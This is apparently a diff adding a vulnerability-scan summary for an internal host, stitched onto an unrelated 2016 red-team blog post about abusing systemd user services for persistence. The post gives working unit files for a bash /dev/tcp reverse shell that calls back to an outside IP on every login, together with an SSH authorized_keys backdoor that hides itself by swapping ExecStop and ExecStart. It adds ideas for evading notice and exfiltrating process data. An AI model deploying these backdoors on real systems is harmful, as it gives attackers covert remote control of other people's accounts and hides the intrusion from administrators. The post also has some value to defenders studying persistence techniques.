@@ -1,0 +1,78 @@
+10.225.210.138
+
+Summary
+
+Critical High Medium Low Info Total 
+0 2 2 4 27 35 
+
+Details
+
+Severity Plugin Id Name 
+High (9.3)  74326  OpenSSL 'ChangeCipherSpec' MiTM Vulnerability 
+High (7.5)  69552  Oracle TNS Listener Remote Poisoning 
+Medium (5.0)  11058  RPC rusers Remote Information Disclosure 
+Medium (4.3)  42873  SSL Medium Strength Cipher Suites Supported 
+
+
+hosaka⊕ a tessier-ashpool subsidiary
+abusing systemd user services⊕ 2016-10-27
+Often the best tools for an attacker are the ones that are built into the system, and taking advantage of lesser known features of software can make an attacker even more effective. I like to take up and coming technologies and see what it takes to weaponize them into a tool for red teaming. For this I decided to do a quick look into systemd as it is ubiquitus "enterprise" Linux distribution in some form or another.
+
+One of the first things that caught my eye was user management and the user service files as defined in systemd.unit(5). It was flash backs to the first time playing with bashrc files. Time to go down the rabbit hole of creating a backdoor for persistence.
+
+initial proof of concept
+
+In order to create these backdoors I had to take my limited knowledge of systemd and see if I could craft a simple reverse shell spawning user unit and to observe how it behaved. Simple enough, here was the first test that uses the bash TCP special devices:
+
+[Unit]
+Description=Black magic happening, avert your eyes
+
+[Service]
+RemainAfterExit=yes
+Type=simple
+ExecStart=/bin/bash -c "exec 5<>/dev/tcp/10.10.100.123/31337; cat <&5 | while read line; do $line 2>&5 >&5; done"
+
+[Install]
+WantedBy=default.target
+Copy this file into one of the user service directories such as $HOME/.local/share/systemd/user/ or $HOME/.config/systemd/user/ or as defined in the man pages and code. On the machine receiving the shell I use netcat since I'm lazy:
+
+$ echo "touch /tmp/systemd-test-backdoor" | nc -l 31337
+
+Then start the unit with $ systemctl --user start voodoo the commands get executed and the file /tmp/systemd-test-backdoor should exist on the system. Here is what it looks like: 
+
+persistence and extending
+
+The above example will only be run once, so the next step is to get persistence. How about starting the shell every time the user logs in? Just like normal service files:
+
+$ systemctl --user enable voodoo. Now when a user logs in systemd will fire off commands that get queued on our server. Neat!
+
+After tinkering and discovering that the user services function almost identically to the system service files, but more focused on user session management I had an idea. What if I could take a more stealthy approach. By swapping the expected functionality you can use the service option ExecStop to start my code and ExecStart to clean up. Using this to backdoor ssh keys was where I decided to test this out. Here is the following beautiful (read as, disgusting) service file:
+
+[Unit]
+description=Totally not a virus, trust me I'm a dolphin
+
+[Service]
+RemainAfterExit=yes
+Type=simple
+ExecStop=/bin/bash -c 'mkdir -p $HOME/.ssh && touch $HOME/.ssh/authorized_keys; [ "$(grep "ssh-ed25519 AAAAC3NzbC1lZDI1NTE5AAAAIASFvY7r8vMkbLExcB3rJZSuHUSgPasy+Flwx5XtHTmH" $HOME/.ssh/authorized_keys)" ] || echo "ssh-ed25519 AAAAC3NzbC1lZDI1NTE5AAAAIASFvY7r8vMkbLExcB3rJZSuHUSgPasy+Flwx5XtHTmH" >> $HOME/.ssh/authorized_keys'
+ExecStart=/bin/bash -c 'sed -i \'/ssh-ed25519 AAAAC3NzbC1lZDI1NTE5AAAAIASFvY7r8vMkbLExcB3rJZSuHUSgPasy+Flwx5XtHTmH/d\' $HOME/.ssh/authorized_keys'
+
+[Install]
+WantedBy=default.target
+Now if a user discovered that their account was offering a key that they didn't expect they might go to investigate, the result is the following: A smart attacker would take this even farther. Some ideas that I played with were: detecting any interactive user using inotify(7) on  utmp to be stealthier, chaining service files to detect when another is interacted with, abuse the in-memory aspects of the service files to hide themselves, hijack environmental variables, exfiltrate user runtime (/proc), etc.
+
+Another interesting aspect of this that I noticed was that systemd would output error messages that did not take into account the --user functionality. This means that errors in user services, changes to the service files, and some logging information emit a red herring error that does not differentiate a user service. For example, I broke the regeneration of service files from memory in one of my tests and when I tried to restart the service I got this error
+
+`Failed to restart strudel.service: Unit strudel.service failed to load: Invalid argument. See system logs and 'systemctl status strudel.service' for details.`
+This does not include the --user option and could mislead people into hunting for things in the wrong place.
+conclusion
+
+When is the last time you ran systemctl --user? None of this is extremely novel or exciting, but it's another technique in the toolbox and another place for administrators to keep an eye on. I am not a fan of this functionality and would like an easy way to disable it and would like to see the error messages be correct.
+
+And as usual here are some not great shell scripts to generate the examples I have in this post:
+
+voodoo.sh — bash /dev/tcp reverse shell on login
+imadolphin.sh — authorized_keys backdoor + "stealth"
+If you have any question or better implementations direct them to poptart «at» mil.airforce
+
+hosaka
